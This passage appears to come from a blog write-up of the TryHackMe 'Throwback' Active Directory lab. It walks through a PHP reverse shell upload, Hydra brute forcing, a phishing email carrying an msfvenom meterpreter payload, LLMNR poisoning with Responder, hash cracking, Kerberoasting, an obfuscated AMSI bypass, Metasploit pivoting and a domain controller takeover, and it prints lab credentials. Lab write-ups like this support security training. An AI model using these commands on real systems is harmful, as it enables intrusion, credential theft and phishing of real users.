</pre></table></code></div></div><p>Let’s check if the shell works.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/pingch.png" alt="ping check" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/tcpdump1.png" alt="tcpdump" /> <code class="language-plaintext highlighter-rouge">tcpdump step if the shell was blind</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tcpdump <span class="nt">-i</span> tun0 icmp
</pre></table></code></div></div><h4 id="32-throwback-fw01-reverse-shell">3.2 ThrowBack-FW01 reverse shell</h4><p>I will use <code class="language-plaintext highlighter-rouge">uploading shell way</code></p><ol><li><p>Upload shell <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/upload_shell_php.png" alt="upload_shell_php_wf01" /> you can download the shell from <a href="/assets/shell/shell.php">shell.php</a> don’t forget to change the ip/port.</p><li><p>Netcat listener <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/wf-nc-check.png" alt="nc_listener_wf01" /></p></ol><p>netcat listener: <code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code></p><h4 id="33-throwback-fw01-looking-for-interested-files">3.3 ThrowBack-FW01 looking for interested files</h4><ol><li>First we take a look for log files.</ol><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/wf-login_log.png" alt="login.log" /></p><blockquote><p>login.log isn’t a default log file.</p></blockquote><p>We found a user Credentials. Let’s try to decode it online. <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/wf-decode-pass.png" alt="" /></p><blockquote><p>HumphreyW:1c13639dba96c7b53d26f7d00956a364:securitycenter</p></blockquote><h3 id="4-throwback-mail--10200154232"><strong>4 ThrowBack-Mail 10.200.154.232</strong></h3><h4 id="41-throwback-mail-web-service">4.1 ThrowBack-mail web service</h4><p>URL: <a href="http://10.200.154.232">http://10.200.154.232</a> <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/mail-serv-1.png" alt="mail-web-1" /> As you see we found a guest credentials in the home page. We will use them to login. <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/mail-loing-succ.png" alt="mail-web-login" /> However, the benefits to us is getting the company’s address book, giving us a nice list of employees, usernames, and their associated e-mail addresses. <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/users-email.png" alt="users-email" /></p><h4 id="42-throwback-mail-brute-force">4.2 ThrowBack-mail brute force</h4><p>We will use hydra to get valid users. We have a users list. So, we need a password list. We have one problem as we don’t know the password policy till now. I will use the password list below. <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/pass_creds.png" alt="passes" /></p><p>You can download users list from <a href="/assets/files/tryhackme/throwback/names.txt">here</a>.</p><p>You can download passwords list from <a href="/assets/files/tryhackme/throwback/pass.txt">here</a>.</p><h5 id="421-hydra">4.2.1 Hydra</h5><p>First, We need to get the user and password parameter in the request. We can get it with <code class="language-plaintext highlighter-rouge">inspect element</code> <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/inspect element.png" alt="inspect element" /> Now, we can run hydra:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hydra <span class="nt">-L</span> names.txt <span class="nt">-P</span> pass.txt 10.200.154.232 http-post-form <span class="s2">"/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^:Unknown user or password incorrect"</span>
</pre></table></code></div></div><p>Here we got some valid credentials.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/prod-valid.png" alt="prod-valid" /></p><p>Let’s combine them together.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/combined1.png" alt="combined" /></p><h4 id="43-throwback-mail-as-murphyf">4.3 ThrowBack-mail as MurphyF</h4><p>After trying the valid credentials we have. I’ve found that <code class="language-plaintext highlighter-rouge">MurphyF</code> is the important one. So, let’s login as <code class="language-plaintext highlighter-rouge">MurphyF</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>url: http://10.200.154.232/
username: MurphyF
password: Summer2020
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/murphy-login.png" alt="MurphyFlogin" /></p><p>From the mail box. We found that there is a mail to reset password. Let’s open it.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/reset_password.png" alt="resetPassword" /></p><p>The reset link needs to resolve the DNS to its IP, but we don’t know it till now. So, Let’s save it as a note.</p><h3 id="5-throwback-ws01--10200154222"><strong>5 ThrowBack-WS01 10.200.154.222</strong></h3><p>As we logged in as <code class="language-plaintext highlighter-rouge">DaviesJ:Management2018</code> on the mail-server <a href="http://10.200.154.232">http://10.200.154.232</a>. We found an email which include a <code class="language-plaintext highlighter-rouge">exe</code> file. So, we have an option here to use a phishing attack.</p><p><strong>Creating the shell</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>tun0 <span class="nv">lport</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> cleaner.exe
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/reverse_shell.png" alt="cleaner.exe" /></p><p>Now, we have to create a phishing mail.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/mail-phishing.png" alt="mail-phishing" /></p><p><code class="language-plaintext highlighter-rouge">Don't forget to change priority to high</code></p><p>After sending the mail, We will get a callback session. <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/reverse_shell_session2.png" alt="reverse_shell_session" /></p><p>Check the sysinfo.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/sysinfo-ws-01.png" alt="sysinfo_ws01" /></p><p>Here we are. We found a new machine with it’s ip <code class="language-plaintext highlighter-rouge">10.200.154.222</code></p><h4 id="51-throwback-ws01">5.1 ThrowBack-WS01</h4><p>First, we need to migrate our session into a system process. Second, we need to get hashes on this machine.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/ws01-migrate_hashdump.png" alt="ws01-migrate_hashdump" /></p><p>After serval attempts of trying to get the hash of <code class="language-plaintext highlighter-rouge">BlaireJ</code>, but failure was our friend.</p><h3 id="6-throwback-prod--10200154219"><strong>6 ThrowBack-PROD 10.200.154.219</strong></h3><p>First things first, we have a humphrey’s credentials. So we will try ssh, but it doesn’t work. So we goes towards the web service.</p><h4 id="61-throwback-prod-web-service">6.1 ThrowBack-prod web service</h4><p>URL: <a href="http://10.200.154.219">http://10.200.154.219</a></p><p>After some digging we have nothing interested here. <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/prod-web-1.png" alt="prod-web-1" /></p><p>Let’s back to <code class="language-plaintext highlighter-rouge">ThrowBack-PROD</code> as there’s nothing to do with other machines, we have accessed.</p><h4 id="62-throwback-prod-ssh-brute-force">6.2 ThrowBack-PROD SSH brute force.</h4><p>I’ve used <code class="language-plaintext highlighter-rouge">hydra</code> with the credentials we got from throwback-mail. Non of them accessed.</p><h4 id="63-prod-abusing-nbt-nsllmnr-poisoning">6.3-PROD abusing NBT-NS/LLMNR poisoning.</h4><p>One of the easiest ways to collect credentials is <a href="https://www.cynet.com/attack-techniques-hands-on/llmnr-nbt-ns-poisoning-and-credential-access-using-responder/">abusing NBT-NS/LLMNR poisoning</a>.</p><p><strong>let’s talk about NBT-NS/LLMNR poisoning</strong></p><p>LLMNR(Link-Local Multicast Name Resolution) and NetBIOS Name Service (NBT-NS) are windows domain services that works for host identification.</p><p>LLMNR likes DNS: Allows hosts in the local network to use names instead of IPs.</p><p>NBT-NS: Used to identify systems on a network by their NetBIOS name.</p><p><strong>LLMNR Poisoning</strong></p><p>You can spoof the source for name resolution on a victim network using responder, a tool used to respond to LLMNR and NBT-NS requests acting as though you know the identity of the host. “Poisoning” the service so that the victims will communicate with our machine. If the host belongs to a resource that requires identification the user and their NTLMv2 hash will be sent to the attacker. These hashes can then be collected from responder and taken offline to be cracked and then used to access the poisoned user’s machines or can be taken into PSExec to get a shell.</p><p>We will use a tool called <a href="https://github.com/lgandx/Responder">Responder</a>.</p><ol><li><p>It will listen to multicast NR (Name Request) requests. It will redirect the victim user to our attacking machine instead of demanded machine.</p><li><p>Once the victim tries to connect our machine, Responder will steal users credentials <code class="language-plaintext highlighter-rouge">username/hash</code></p></ol><p><strong>Running Responder</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>responder <span class="nt">-I</span> tun0 <span class="nt">-rdw</span> <span class="nt">-v</span>
</pre></table></code></div></div><p>after some minutes we will get a victim. PetersJ is the victim from <code class="language-plaintext highlighter-rouge">ThrowBack-PROD</code>.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/llmnr_victim.png" alt="llmnr_victim" /></p><h4 id="64-throwback-prod-cracking-password">6.4 ThrowBack-PROD cracking password.</h4><p>We have a hashed password. Let’s try to get the password. We will use <code class="language-plaintext highlighter-rouge">hashcat</code>.</p><p>First, you need to download <a href="https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule">OneRuleToRuleThemAll</a>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hashcat <span class="nt">-m</span> 5600 PetersJ.hash /opt/rockyou.txt <span class="nt">-r</span> /root/.hashcat/OneRuleToRuleThemAll.rule <span class="nt">--debug-mode</span><span class="o">=</span>1 <span class="nt">--debug-file</span><span class="o">=</span>matched.rule
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/hash_petersj.png" alt="petersj" /></p><p>The password is: <code class="language-plaintext highlighter-rouge">Throwback317</code></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/peters_decode.png" alt="peters_decode" /></p><h4 id="65-throwback-prod-ssh">6.5 ThrowBack-PROD SSH.</h4><p>Using those credentials to ssh ThrowBack-PROD.</p><p>Password: <code class="language-plaintext highlighter-rouge">Throwback317</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh PetersJ@10.200.154.219
</pre></table></code></div></div><h4 id="66-throwback-prod-privilege-escalation">6.6 ThrowBack-PROD Privilege Escalation.</h4><p>After checking our rights, We found that we need to escalate our privileges. So, I used starkiller <code class="language-plaintext highlighter-rouge">seatbelt</code> module. You can run it from windows or use winpeas.</p><p><a href="https://github.com/GhostPack/Seatbelt">seatbelt</a></p><p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">winpeas</a></p><p>We found a AutoLogon credentials:</p><blockquote><p>username : BlaireJ</p></blockquote><blockquote><p>Password : 7eQgx6YzxgG3vC45t5k9</p></blockquote><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/prod_privilege_escalation.png" alt="BlaireJ" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/bairej_admin_prod.png" alt="bairej_admin_prod" /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>##### 3.5.6 ThrowBack-PROD useful data.
</pre></table></code></div></div><p>Now, we finished this machine, but we need something to use in the next step:</p><ol><li>What is the IP of <code class="language-plaintext highlighter-rouge">timekeep.throwback.local</code><li>What is the Domain Controller IP.<li>Use this machine as a pivot to access other machines.</ol><p>Let’s start with <code class="language-plaintext highlighter-rouge">timekeep.throwback.local</code></p><p>we will use <code class="language-plaintext highlighter-rouge">nslookup</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nslookup THROWBACK-TIME.throwback.local
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/timekeep_ip.png" alt="timekeep_ip" /></p><p>To get Domain Controller IP.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ipconfig /displaydns
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/domain_controller_ip.png" alt="domain_controller_ip" /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>THROWBACK-TIME.throwback.local : 10.200.154.176
THROWBACK-DC01.throwback.local : 10.200.154.117
</pre></table></code></div></div><p>let’s edit our hosts file</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"10.200.154.176  timekeep.throwback.local"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h3 id="7-pivot-using-throwback-prod-session">7. Pivot using ThrowBack-PROD session</h3><p>We will use the autoroute module from Metasploit Framework. We need a meterpreter session.</p><ol><li>Pause Amsi.<li>create a reverse shell as we did before for mail phishing.<li>start the listener on msfconsole.</ol><p>Pausing Amsi.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sET-ItEM <span class="o">(</span> <span class="s1">'V'</span>+<span class="s1">'aR'</span> + <span class="s1">'IA'</span> + <span class="s1">'blE:1q2'</span> + <span class="s1">'uZx'</span> <span class="o">)</span> <span class="o">(</span> <span class="o">[</span>TYpE]<span class="o">(</span> <span class="s2">"{1}{0}"</span><span class="nt">-F</span><span class="s1">'F'</span>,<span class="s1">'rE'</span> <span class="o">)</span> <span class="o">)</span> <span class="p">;</span> <span class="o">(</span> GeT-VariaBle <span class="o">(</span> <span class="s2">"1Q2U"</span> +<span class="s2">"zX"</span> <span class="o">)</span> <span class="nt">-VaL</span> <span class="o">)</span>.<span class="s2">"AssEmbly"</span>.<span class="s2">"GETTYPe"</span><span class="o">((</span> <span class="s2">"{6}{3}{1}{4}{2}{0}{5}"</span> <span class="nt">-f</span><span class="s1">'Util'</span>,<span class="s1">'A'</span>,<span class="s1">'Amsi'</span>,<span class="s1">'.Management.'</span>,<span class="s1">'utomation.'</span>,<span class="s1">'s'</span>,<span class="s1">'System'</span> <span class="o">)</span> <span class="o">)</span>.<span class="s2">"getfiElD"</span><span class="o">(</span> <span class="o">(</span> <span class="s2">"{0}{2}{1}"</span> <span class="nt">-f</span><span class="s1">'amsi'</span>,<span class="s1">'d'</span>,<span class="s1">'InitFaile'</span> <span class="o">)</span>,<span class="o">(</span> <span class="s2">"{2}{4}{0}{1}{3}"</span> <span class="nt">-f</span> <span class="s1">'Stat'</span>,<span class="s1">'i'</span>,<span class="s1">'NonPubli'</span>,<span class="s1">'c'</span>,<span class="s1">'c,'</span> <span class="o">))</span>.<span class="s2">"sETVaLUE"</span><span class="o">(</span> <span class="k">${</span><span class="nv">nULl</span><span class="k">}</span>,<span class="k">${</span><span class="nv">tRuE</span><span class="k">}</span> <span class="o">)</span>
</pre></table></code></div></div><p>The past command is :<code class="language-plaintext highlighter-rouge">[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)</code></p><p>After getting the reverse shell.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/autoroute_prod.png" alt="autoroute_prod" /></p><p>then we will use socks_server module and run it.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/socks_proxy.png" alt="socks_proxy" /></p><p>edit proxychains config file.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/proxychains_file.png" alt="proxychains_file" /></p><ol><li>There is 2-versions of proxychains v4/v5. Make sure the version you use from metasploit the same as you use from bash.<li>The same port you use in socks_proxy as conf file.</ol><p>Check</p><p>As we know previsouly that ThrowBack-WS01 port <code class="language-plaintext highlighter-rouge">445</code> is open. We will check it with using pivot. We can’t check other ports as we don’t know they open/closed.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/with_proxychains.png" alt="with_proxychains" /></p><p>Now, Our proxychains works as expected. So, Let’s detect other machines <code class="language-plaintext highlighter-rouge">DC01 and timekeep</code>.</p><hr /><h3 id="8-throwback-time-10200154176">8. <strong>ThrowBack-Time 10.200.154.176</strong></h3><h4 id="81-ssh">8.1 SSH</h4><p>credentials: Timekeeper: keeperoftime</p><hr /><h4 id="82-spn">8.2 SPN</h4><p>After checking the opening ports we found that port 3306 is opened. As we know that port related to mysql. Also most of times SQLService accounts will have an SPN. So let’s check it.</p><p><code class="language-plaintext highlighter-rouge">proxychains GetUserSPNs.py -dc-ip 10.200.154.117 THROWBACK.LOCAL/BlaireJ:7eQgx6YzxgG3vC45t5k9</code></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/spn1.png" alt="spn1" /></p><p>As we expected that SQLService is vulnerable. Let’s try to catch the flag. Let’s get it by using <code class="language-plaintext highlighter-rouge">-request</code></p><p><code class="language-plaintext highlighter-rouge">proxychains GetUserSPNs.py -dc-ip 10.200.154.117 THROWBACK.LOCAL/BlaireJ:7eQgx6YzxgG3vC45t5k9 -request</code></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/spn_2_2.png" alt="spn_2_2" /></p><p>If you have an error like <code class="language-plaintext highlighter-rouge">Kerberos SessionERROR: KRB_AP_ERR_SKEW(Clock skew too great)</code> you need to sync the time with the AD server <code class="language-plaintext highlighter-rouge">proxychains rdate -n 10.200.154.117</code> or <code class="language-plaintext highlighter-rouge">proxychains ntpd 10.200.154.117</code></p><p>Now, we have the hash let’s retrieve it to plain text.</p><p><code class="language-plaintext highlighter-rouge">john --wordlist=~/tools/rockyou.txt hashes/sql_server</code></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/spn_2_3.png" alt="spn_2_3" /></p><h4 id="83-mysql">8.3 MYSQL</h4><p><code class="language-plaintext highlighter-rouge">password: mysql1337570</code></p><p>Let’s dump the database.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/mysql1.png" alt="mysql1" /></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>1. show databases<span class="p">;</span>
2. use domain_users<span class="p">;</span>
3. show tables<span class="p">;</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/sql4.png" alt="sql4" /></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>1. show databases<span class="p">;</span>
2. use timekeepusers<span class="p">;</span>
3. show tables<span class="p">;</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/mysql32.png" alt="sql2" /></p><h3 id="9-throwback-dc01-----10200154117">9. <strong>ThrowBack-DC01 10.200.154.117</strong></h3><p>Now, we have a list of users and passwords. Let’s try to use all of them.</p><ol><li>Add them to valid credentials that we have before.<li>Brute force for valid credentials using cme.</ol><p><code class="language-plaintext highlighter-rouge">proxychains crackmapexec smb 10.200.154.117 -u users.timekeeper -p pass.timekeeper</code></p><p>Download: <a href="/assets/files/tryhackme/throwback/users.timekeeper.txt">users.timekeeper</a></p><p>Download: <a href="/assets/files/tryhackme/throwback/pass.timekeeper.txt">pass.timekeeper</a></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/dc01-1.png" alt="dc01-1" /></p><h4 id="91-throwback-dc01-ssh">9.1 ThrowBack-DC01 SSH</h4><p>Now, we have a valid credentials to domain controller. Let’s connect!</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/dc01-ssh_connect.png" alt="dc01-ssh_connect" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/dc01-ssh-2.png" alt="dc01-ssh2" /></p><h4 id="92-throwback-dc01-backup-users">9.2 ThrowBack-DC01 BackUp users.</h4><p>Now, we will take a look for all text files in all users files.</p><p><code class="language-plaintext highlighter-rouge">dir /s /a *.txt</code></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/dir_dc01-1.png" alt="dir_dc01-1" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/backup_notes.png" alt="backup_notes" /></p><p>We found a very interested file called <code class="language-plaintext highlighter-rouge">backup_notice.txt</code>. We have to read it.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/backupnotice.png" alt="backupnotice" /></p><p>There’s a password to the backup user. Let’s login with those new credentials <code class="language-plaintext highlighter-rouge">backup:TBH_Backup2348!</code></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/backup_afterlogin.png" alt="backup_afterlogin" /></p><h4 id="93-throwback-dc01-dumping-hashes">9.3 ThrowBack-DC01 dumping hashes.</h4><p>We will go for dumping all users hashes.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/secretdump1.png" alt="secretdump1" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/secretdump2.png" alt="secretdump2" /></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hashcat <span class="nt">-m</span> 1000 mercerh /opt/rockyou.txt  <span class="nt">-r</span> /root/.hashcat/OneRuleToRuleThemAll.rule
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/secretdump4.png" alt="secretdump4" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/secretdump3.png" alt="secretdump3" /></p><h4 id="94-throwback-dc01-with-mercerh">9.4 ThrowBack-DC01 with mercerh.</h4><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/mercerh1.png" alt="mercerh1" /></p><p>check MercerH privileges.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/mercerh2.png" alt="mercerh2" /></p><p>Now, As we got that mercerh is an admin in the domain controller. So, we have nothing to do in this forest. Let’s look for another forest.</p><p>I will use C2 module. You can use powerview/ActiveDirectory modules.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/num1.png" alt="num1" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/num2.png" alt="num2" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/num3.png" alt="num3" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/num4.png" alt="num4" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/num5.png" alt="num5" /></p><p>Let’s remark our notes.</p><ol><li>Another domain <code class="language-plaintext highlighter-rouge">corporate.local</code><li><code class="language-plaintext highlighter-rouge">10.200.154.118</code> for <code class="language-plaintext highlighter-rouge">CORP-DC01.corporate.local</code><li><code class="language-plaintext highlighter-rouge">10.200.154.243</code> for <code class="language-plaintext highlighter-rouge">CORP-ADT01.corporate.local</code></ol><h3 id="10-pivot-using-throwback-dc01-session">10. <strong>Pivot using ThrowBack-DC01 session</strong></h3><p>Now, we have a trusted forest <code class="language-plaintext highlighter-rouge">corporate.local</code> with the trusted user <code class="language-plaintext highlighter-rouge">MercerH</code>. We can’t use our current pivot session <code class="language-plaintext highlighter-rouge">ThrowBack-Prod</code> as <code class="language-plaintext highlighter-rouge">corporate.local</code> trust <code class="language-plaintext highlighter-rouge">ThrowBack-DC01</code>. We have to use <code class="language-plaintext highlighter-rouge">ThrowBack-DC01</code> as a new pivot session.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/pivot2.png" alt="pivot2" /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>1. we have 2-sessions session2 from ThrowBack-prod and session3 from ThrowBack-DC01.
2. Delete the old routing session.
3. Add the new routing session.
</pre></table></code></div></div><h3 id="11-corporate-dc01-10200154118">11. <strong>Corporate-DC01 10.200.154.118</strong></h3><h4 id="112-corporate-dc01-with-mercerh">11.2 Corporate-DC01 with mercerh</h4><p>Let’s connect to the new forest with the credentials we have. Now, you have to change the route to corporate-dc01 session.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/corporate1.png" alt="corporate1" /></p><h3 id="12-corporate-adt01-10200154243"><strong>12 Corporate-ADT01 10.200.154.243</strong></h3><h4 id="121-corporate-adt01-with-daviesj">12.1 Corporate-ADT01 with DaviesJ</h4><p>We logged in, but we aren’t the admin. let’s take a look.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/server_status1.png" alt="server_status1" /></p><p>There’s a interested file called <code class="language-plaintext highlighter-rouge">server_update.txt</code>. Let’s check it.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/server_status2.png" alt="server_status2" /></p><p>It a note about using the DNS of 10.200.154.232 . As we know previsouly that this the mail server. So let’s add them.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"10.200.154.232  mail.corporate.local breachgtfo.local"</span> <span class="o">&gt;&gt;</span> /etc/hosts
